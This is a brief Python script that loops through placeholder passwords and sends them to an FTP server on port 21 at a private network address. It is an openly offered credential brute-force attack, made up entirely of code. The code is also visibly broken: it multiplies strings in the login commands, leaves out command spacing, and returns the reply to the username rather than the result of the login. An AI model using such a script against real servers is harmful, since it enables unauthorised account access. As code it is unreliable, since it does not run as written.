import socket
import re
import sys

def connection(ip, user, passw):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Trying" + ip + ":" + user + ":" + passw)
    sock.connect((ip, 21))
    data = sock.recv(1024)
    sock.send('User' + user * '\r\n')
    data = sock.recv(1024)
    sock.send('Pass' + passw * '\r\n')
    sock.send('quit\r\n')
    sock.close()
    return data

user = "user1"
pswds = ["pswd1", "pswd2", "pswd3", "pswd4", "pswd5"]

for password in pswds:
    print (connection('192.168.0.104', user, password))
